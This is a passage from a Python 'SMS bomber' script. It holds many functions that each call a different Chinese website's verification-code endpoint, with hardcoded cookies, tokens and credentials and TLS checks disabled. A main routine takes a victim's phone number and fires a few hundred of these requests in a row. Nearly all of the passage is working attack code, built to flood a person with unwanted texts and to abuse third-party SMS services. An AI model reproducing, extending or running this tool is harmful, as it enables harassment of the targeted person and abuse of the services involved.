    url = 'https://www.xinlaichewang.com/xlcw/index.php/api/api_huozhan/regsms'
    payload2 = {'tel': phone}
    headers = {'Cookie': 'ASPSESSIONIDQCQRRSQT=OOALBPOBLLFPEIILNGAIBPLP; PHPSESSID=dq2ae6drqknt593f7cl2hc51tn', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'www.xinlaichewang.com', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 (Immersed/28.0) Html5Plus/1.0', 'Content-Type': 'application/x-www-form-urlencoded', 'X-Request-ID': 'CRsw7hZvXTbm6', 'Authorization': ''}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_cms_sctvcloud_com(phone):
    'sctvcloud.com 发送验证码'
    url = 'https://cms.sctvcloud.com:37443/api/oauth/client/anno/authcode'
    payload = {'tenant': 'YTM0MzU=', 'authCodeType': 'login', 'phone': phone}
    headers = {'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'cms.sctvcloud.com:37443', 'Content-Type': 'application/json; charset=utf-8', 'timestamp': str(int((time.time() * 1000))), 'tenant': 'YTM0MzU=', 'Authorization': 'Basic c2N0dl91aTpzY3R2X3VpX3NlY3JldA=='}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_blacksilverscore_com(phone):
    'blacksilverscore.com 发送验证码'
    url = 'https://api.blacksilverscore.com/base/api/v1/sms/send'
    payload = {'type': 1, 'phone': phone}
    headers = {'User-Agent': 'okhttp/4.9.1', 'Cookie': 'JSESSIONID=uVcji004yMkd9Xspx5igPzt7e2Lt5TOs1bNRwaNH', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.blacksilverscore.com', 'Content-Type': 'application/json; charset=UTF-8', 'platform': 'CLIENT'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_bafang_sf0000_com_cn(phone):
    'sf0000.com.cn 发送验证码'
    url = 'https://bafang.sf0000.com.cn/api/sms/send'
    payload = {'event': 'register', 'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'bafang.sf0000.com.cn', 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'Accept': 'application/json'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_dangwuyou_cn(phone):
    'dangwuyou.cn 发送验证码'
    url = 'https://api.dangwuyou.cn/dwyapp/sendCode'
    payload2 = {'phone': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.dangwuyou.cn', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'Content-Type': 'application/json; charset=UTF-8', 'token': ''}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_api_yunfang2021_com(phone):
    'yunfang2021.com 发送验证码'
    url = 'https://api.yunfang2021.com/sms/send'
    payload = {'phone': phone, 'type': 3}
    headers = {'User-Agent': 'okhttp/3.12.12', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.yunfang2021.com', 'Content-Type': 'application/json; charset=utf-8', 'AuthToken': 'V97xMdsrkYhq/nwL3eWC1Q==&OG711wlX3/Xjhz3kGQaH0g==&fEpWQWYJNqao7HrIjHXxr2+LotTvuhJltvtIvL2udntiyIUpt3uqld1s/hAgzszr&VoXV7wO5inPUPu1H21jZZqQToQZvz+ONfPLXvinfWL/r2KzHRcDySxsLcddO5iSq&S6IVWgdgQZLis3Nj+3Wx/A==&urDVJlBqfVk6OpE2cD8Cxg==&dPV9dBC/rh2JK9JM2hvD1KjZtfNNyPxnqr3H5vBX/2c='}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_apigw_yoonop_com(phone):
    'yoonop.com 发送验证码'
    url = ''.join(['https://apigw.yoonop.com/yoonop/api/RegistUser/SendValidateCode?phone=', str(phone)])
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'apigw.yoonop.com', 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'LoginPlatfromCode': 'MainIdentifier', 'LoginPlatfromName': '5LyY5Yac5biuQVBQ', 'AppVersion': '2.2.6'}
    requests.post(url, headers=headers, timeout=10, verify=False)

def bomber_service_account_qiuxiang_tech(phone):
    'qiuxiang.tech 发送验证码'
    url = 'https://service-account.qiuxiang.tech/api/sms/bao'
    payload2 = {'phone': phone}
    headers = {'Cookie': 'acw_tc=7030ae0b17818582157593157ef90b97424259e6d2cc6bf8323f0acc0b; cdn_sec_tc=7030ae0b17818582157593157ef90b97424259e6d2cc6bf8323f0acc0b', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'service-account.qiuxiang.tech', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)', 'Os-Platform': 'android', 'DeviceId': '97593b844370ce7adf3985123c81b89c122629a7e443ff70700866f66279391d', 'App-Ver': '1.1.51.8', 'Authorization': ''}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_api_cnqiangnong_com(phone):
    url = 'https://api.cnqiangnong.com/api/TokenAuth/SendSmsCode'
    payload = {'phoneNumber': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.cnqiangnong.com', 'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'Authorization': 'Bearer', 'User-Agent': 'Android_161_qn'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_wj_yichongdian_top(phone):
    'yichongdian.top 发送验证码'
    url = 'https://wj.yichongdian.top/api/app/user/login/smsCode'
    payload = {'phone': phone}
    headers = {'Cookie': 'locale=en-us', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'wj.yichongdian.top', 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 (Immersed/28.0) Html5Plus/1.0', 'language': 'zh-cn', 'Authorization': ''}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_lx_yodatech_cn(phone):
    'yodatech.cn 发送验证码'
    url = ''.join(['https://lx.yodatech.cn/app/msm/getMsg?phone=', str(phone), '&sendType=1'])
    headers = {'User-Agent': 'okhttp/3.8.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'lx.yodatech.cn', 'Content-Type': 'application/json;charset=UTF-8'}
    requests.get(url, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api2new_babasuper_com(phone):
    url = 'https://api2new.babasuper.com/app/bauser/AppRegisterSendMsg.do'
    data = {'terminalType': '0', 'ipAddr': '192.168.10.247', 'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api2new.babasuper.com', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; iPA2375 Build/UP1A.231005.007)', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_treat_xumutang999_com(phone):
    'xumutang999.com 发送验证码'
    url = 'https://treat.xumutang999.com/ycyl-app-treat/api/smsSend'
    data = {'mobile': phone}
    headers = {'User-Agent': 'okhttp/3.6.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'treat.xumutang999.com', 'Content-Type': 'application/x-www-form-urlencoded', 'token': '', 'Accept': '*/*'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_yifeng_com(phone):
    'yifeng.com 发送验证码'
    url = 'https://api.yifeng.com/admin/appapi/login_code'
    data = {'token': '', 'phone': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.yifeng.com', 'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.0)'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))
if (__name__ == '__main__'):
    phone = input('请输入手机号: ').strip()
    if ((not phone.isdigit()) or (len(phone) != 11)):
        print('手机号格式错误')
        exit(1)
    bomber_list = [bomber_app_api_zjxinyijia_cn, bomber_dlmixc_parking_lncrland_cn, bomber_ngssa_caizidao_com_cn, bomber_cms_hrhgstock_com, bomber_wapp_ppwfund_com, bomber_asms_m_isignet_cn, bomber_passport_fanli_com, bomber_wxweb_huashenghaoche_com, bomber_www_dxmbaoxian_com, bomber_pub_yaofangwang_com, bomber_weapp_91160_com, bomber_www_hbxyjob_cn, bomber_gig_c_api_1haozc_com, bomber_xuexi_wacai_com, bomber_api_livelab_com_cn, bomber_hyqb_jinnuodai_com_cn, bomber_wechat_chinalife_p_com_cn, bomber_m_touker_com, bomber_unifyapp_guominpension_com, bomber_passport_xag_cn, bomber_support_mikecrm_com, bomber_ptlogin_4399_com, bomber_yun_api_startupfun_cn, bomber_sms_madudu_com_cn, bomber_jkb_sxjgsw_gov_cn, bomber_jdapi_jd100_com, bomber_www_9377_com, bomber_api_cf40_com, bomber_w_chengtakj_com, bomber_cjapp_cjfco_com_cn, bomber_jidaiapi_tianxiangkj_cn, bomber_a_xrwangluo_com, bomber_api_sdbao_com, bomber_api_xiaoxiangyoupin_com, bomber_wechat_todesk_com, bomber_wappass_baidu_com, bomber_ggr_jiliguala_com, bomber_id_kuaishou_com, bomber_zt_bjgas_com, bomber_id_app_acfun_cn, bomber_api_shanxindafy_com, bomber_caihangzg_cn, bomber_m_ylzhaopin_com, bomber_www_job2050_com, bomber_www_tailgdd_com, bomber_xcontrol_com_cn, bomber_www_hzbzh_com, bomber_app_api_meowhub_cn, bomber_www_mysmp_cn, bomber_rcpass_com, bomber_admin_esjiekeiot_com, bomber_habit_api_jielema_cc, bomber_fanshu1_com, bomber_app_api_fengchaojianzhi_com, bomber_api_gdcaiyanshe_cn, bomber_agrivoice_gcjxboss_com, bomber_jxt_jiuxiaotou_com, bomber_app_zl6lz_com, bomber_app_swee9_icu, bomber_ai_entity_cremomo_cn, bomber_tx_huidoutx_com, bomber_app_bridge_chinese_cn, bomber_api_prod_qianbi_cool, bomber_api_kuochat_cn, bomber_cyr_mshen_xin, bomber_www_xiaosu_travel_cn, bomber_shuang_fuliaoxx_com, bomber_ziyue, bomber_botstreet_io, bomber_app_kayouxkd_com, bomber_developer_douya_wang, bomber_radar_api_liwusong_cn, bomber_xieqidong_com_cn, bomber_hs_fpv_com, bomber_api_xiangqinhui_love, bomber_dhhapi_gean5_top, bomber_api_server_dreamhangar_cn, bomber_app_younggenelove_cn, bomber_jnc_qquanyun_top, bomber_www_aiyimaiquan_com, bomber_api_xxsy_site, bomber_api_heartmeetai_com, bomber_tools_hnyynet_com_cn, bomber_m_jiexiaoke_com, bomber_www_chat2080_com, bomber_hmdj_genesisnode1_cn, bomber_www_dianjixinli_cn, bomber_consumer_szxjhui_com, bomber_vchat_mokatech_cn, bomber_api_mini_immomo_com, bomber_www_zaihun_com_cn, bomber_api_meetuvip_com, bomber_api_xiangbanwl_com, bomber_pro_zhitian_api_timeshuttle_cn, bomber_api_yilianxq_com, bomber_www_jstantan_com, bomber_api_xiban_net, bomber_api_ruiwiw_cn, bomber_server_09784_com, bomber_api_wzaapp_com, bomber_papi_whhyn_shop, bomber_www_sixbits_cn, bomber_api_laland_fun, bomber_www_tuodanmatou_com, bomber_www_huihuang_world, bomber_api_sxqqh_cn, bomber_matchmaking_jlikeji_cn, bomber_www_littlelove_com_cn, bomber_liveopapp_sumlive_cn, bomber_lmilive_lmizhibo_com, bomber_api_qusimi_cn, bomber_api_kuaiyingapp_com, bomber_api_cylive_top, bomber_api_wuhanjijin_com, bomber_admin_uxiutv_com, bomber_zhibo_ishuaji_cn, bomber_freevideo_zqqds_cn, bomber_zhibo_ishuaji_cn, bomber_passport_xinpianchang_com, bomber_njtianyiwl_cn, bomber_mlive_cdinmu_com, bomber_zfs_601book_com, bomber_116_62_116_54, bomber_app_boguapp_top, bomber_91f_xyz, bomber_api_z_t_o_com, bomber_www_hengxingai_net, bomber_app_xgg_minshengji_com, bomber_api_front_maimaidashop_com, bomber_api_bjxunyu_com, bomber_api_ranwenba8_vip, bomber_api_echoic_cn, bomber_newduanju_xinyueyukj_com, bomber_items_shenshuangjc_com, bomber_appapi_cqryjkxxzx_top, bomber_fly_daoran_tv, bomber_api_dafdk_cn, bomber_app_api_quick_bimo8_com, bomber_api_aizhenyue_com, bomber_xzw_api_xingzhits_cn, bomber_wdjapi_qingk_cn, bomber_api_aizhenyue_com, bomber_xzw_api_xingzhits_cn, bomber_htvideo_portal_api_sywj_cn, bomber_m_yidanbo_com, bomber_dance202_ynbit_com, bomber_rkrddepa_fjgdwl_com, bomber_appapi_whhsxxgs_top, bomber_www_hzbzh_com, bomber_app_api_meowhub_cn, bomber_www_shengyinjiazhi_com, bomber_capybara_yangjian_co, bomber_api_shouzhetianxia_com, bomber_app_test_taskmessage_com, bomber_dfu_zklf_tech_com, bomber_ppl_ming_net_cn, bomber_colo_app_laniakeasc_com, bomber_app_zhuxing_vip, bomber_app_zhuxing_vip, bomber_app_chukexia_com_cn, bomber_wap_5kejia_com, bomber_www_laidaquan_com, bomber_app_1009_com_cn, bomber_app_1009_com_cn, bomber_m_taiyouhe_com, bomber_m_taiyouhe_com, bomber_yq_ucanyun_com, bomber_dada_wanwujiekedayouda_com, bomber_dada_wanwujiekedayouda_com, bomber_app_szquandz_com, bomber_travel_partner_car_yucunkeji_com, bomber_web_zzyskj_com, bomber_www_tongchengquanxi_com, bomber_api_blink_app_17gwx_com, bomber_shxy_originalart_cn, bomber_www_ninzhi_com, bomber_api_yuehuomusic_com, bomber_tgg_puhuaweb_com, bomber_m_miansha2020_com, bomber_u_shytkjgs_com, bomber_sdjzq_tianpaiwl_com, bomber_cloud_ace_bot_cn, bomber_api_xiawen_tv, bomber_api_eyepetizer_net, bomber_s_kuailon_com, bomber_mec_yto_net_cn, bomber_app_youhq007_com, bomber_wuyou_order_sto_cn, bomber_yuni_baby, bomber_www_xizai_com, bomber_v4_passport_sohu_com, bomber_app_duomeiziran_com, bomber_merch_airacloud_com, bomber_api_cyol_com, bomber_jf_api_81_cn, bomber_api_yjnt111_top, bomber_api_beawan_com, bomber_api_iyb983_cn, bomber_www_zucaijia_com, bomber_feapi_feheadline_com, bomber_ring_api_jsddx_cn, bomber_api_game_zubajiezuhao_com, bomber_api_octinn_com, bomber_apigame_zubajiezuhao_com, bomber_apiv2_somuseai_com, bomber_m_epiaom_com, bomber_www_zhunanda_com, bomber_api_ai_antusheng_com, bomber_h_zywj_top, bomber_ai_doc_api_gwxzl_com, bomber_yjsgai_yijiushuoguo_com, bomber_www_ruanxx_com, bomber_www_codebanana_com_cn, bomber_client_qzhuli_com, bomber_m_wanwenai_com, bomber_nolaengine_chataimee_com, bomber_phanthy_com, bomber_youyouai_enactflow_com, bomber_api_cn_xxzz123_top, bomber_loverkeyboard_com, bomber_poetryzz_com, bomber_api_cn01_tange365_com, bomber_metaso_cn, bomber_bds_api_cn_baseus_cn, bomber_api_game_duodian_cn, bomber_api_3acg_3ayx_net, bomber_niuxiaoer_net, bomber_eyasapi_job5156_com, bomber_jzmerchant_passportweb_daojia_com, bomber_3g_kq36_com, bomber_api_v2_jianzhugang_com, bomber_csrv_dipin_com, bomber_job_sdjuliangnet_com, bomber_job_sdjuliangnet_com, bomber_zhaogong_qibingzhigong_com, bomber_app_api_fengchaojianzhi_com, bomber_api_feiyujz_com, bomber_app_gufreelancer_com, bomber_api_feiyujz_com, bomber_jdapi_jd121_cn, bomber_api_bingfengjz_top, bomber_api_qzmotong_top, bomber_api_jmjdrlzy_com, bomber_www_budingscan_com, bomber_thunder_mianzhikeji_com, bomber_api_janoneapp_com, bomber_app_ahzudui_com, bomber_app_you_yi_cn, bomber_tqdj_api_10417_com, bomber_ydcsmini_yundasys_com, bomber_www_3_rabbit_com, bomber_village_hemeixiangcun_xn__fiqs8s, bomber_api_huamiwuliu_com, bomber_58_58_126_54, bomber_zizai_work, bomber_lzf_weimahuliann_com, bomber_www_xinlaichewang_com, bomber_cms_sctvcloud_com, bomber_api_blacksilverscore_com, bomber_bafang_sf0000_com_cn, bomber_api_dangwuyou_cn, bomber_api_yunfang2021_com, bomber_apigw_yoonop_com, bomber_service_account_qiuxiang_tech, bomber_api_cnqiangnong_com, bomber_wj_yichongdian_top, bomber_lx_yodatech_cn, bomber_api2new_babasuper_com, bomber_treat_xumutang999_com, bomber_api_yifeng_com]
    total = len(bomber_list)
    for (idx, bomber_func) in enumerate(bomber_list, 1):
        print(''.join(['[', str(idx), '/', str(total), '] 发送中...']), end=' ', flush=True)
        try:
            bomber_func(phone)
            print('✓')
        except Exception:
            print('✗')
        time.sleep(0.1)
    print('\nTa祝你们天天开心！')
